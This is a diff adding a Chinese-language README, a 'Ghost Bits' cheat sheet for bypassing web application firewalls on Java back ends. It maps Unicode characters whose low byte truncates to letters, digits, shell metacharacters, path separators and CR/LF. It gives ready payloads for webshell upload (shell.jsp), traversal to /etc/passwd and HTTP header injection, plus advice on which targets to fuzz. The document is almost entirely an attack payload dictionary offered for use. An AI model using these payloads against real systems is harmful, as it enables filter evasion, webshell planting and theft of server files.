@@ -1,1 +1,77 @@
 # Ghost-Bits-
+
+
+一、Ghost Bits 全字符字典
+1. 原理说明
+Ghost Bits 核心原理：在 Java 等后端语言进行强制类型转换时（例如 (byte) ch），会丢弃高位，仅保留字符的低 8 位。
+示例：Unicode 字符 U+966A（陪）
+16 进制：0x966A -> 截断高位 -> 0x6A
+ASCII 0x6A 对应字符：'j'
+这意味着只要 Unicode 字符的末尾十六进制值等于目标 ASCII 值，就能在某些特定处理逻辑下绕过 WAF 并在后端被还原为目标攻击字符。
+2. 字母区（a-z）
+表格
+目标字符	ASCII (Hex)	Ghost 字符	目标字符	ASCII (Hex)	Ghost 字符
+a	61	乡	n	6E	乮
+b	62	乢	o	6F	乯
+c	63	乣	p	70	买
+d	64	乤	q	71	乱
+e	65	乥	r	72	乲
+f	66	书	s	73	乳
+g	67	乧	t	74	乴
+h	68	乨	u	75	乵
+i	69	乩	v	76	乶
+j	6A	陪	w	77	乷
+k	6B	乫	x	78	乸
+l	6C	乬	y	79	乹
+m	6D	乭	z	7A	乺
+3. 大写区（A-Z）
+表格
+目标	Ghost	目标	Ghost	目标	Ghost	目标	Ghost
+A	䉁	H	䉈	O	䉏	V	䉖
+B	䉂	I	䉉	P	䉐	W	䉗
+C	䉃	J	䉊	Q	䉑	X	䉘
+D	䉄	K	䉋	R	䉒	Y	䉙
+E	䉅	L	䉌	S	䉓	Z	䉚
+F	䉆	M	䉍	T	䉔		
+G	䉇	N	䉎	U	䉕		
+4. 数字区（0-9）
+表格
+目标	Ghost	目标	Ghost	目标	Ghost	目标	Ghost	目标	Ghost
+0	䈰	2	䈲	4	䈴	6	䈶	8	䈸
+1	䈱	3	䈳	5	䈵	7	䈷	9	䈹
+5. 高危符号区（重点）
+表格
+字符	Hex	Ghost 字符	实战用途
+.	2E	䈮	文件扩展名隔离
+/	2F	䈯	路径穿越 (Linux)
+\	5C	䉜	路径穿越 (Windows)
+:	3A	䈺	URL/ 协议分隔 / NTFS 流
+;	3B	䈻	命令执行分隔
+&	26	䈦	Shell 拼接
+|	7C	乼	管道符
+$	24	䈤	变量 / Shell 引用
+`	60	习	内联命令替换
+_	5F	䉟	文件名组成
+-	2D	䈭	命令行参数
+=	3D	䈽	参数赋值
+6. CRLF 注入区
+表格
+字符	Hex	Ghost 字符	含义
+0D	瘍	回车 (CR)
+0A	瘊	换行 (LF)
+09	瘉	制表符 (Tab)
+7. 实战 Payload 案例
+文件上传绕过：
+1. 陪 sp → 1.jsp
+shell. 陪 sp → shell.jsp
+admin. 买乨买 → admin.php
+路径穿越：
+.. 䈯.. 䈯 etc 䈯 passwd ==> ../../etc/passwd
+HTTP Header 注入 (CRLF)：
+abc 瘍瘊 X-Test: hacked ==> abc
+X-Test: hacked
+8. 核心应用场景
+发现以下特征时，应优先使用 Ghost Bits 字典进行模糊测试：
+后端环境：确认是 Java 站 (Spring Boot, Struts2, Tomcat 等)。
+功能点：文件上传、文件下载、数据导出 (文件名处理)、老旧系统的 URL 解析逻辑。
+防御现状：目标存在 WAF，且常规 ASCII 攻击载荷被拦截。
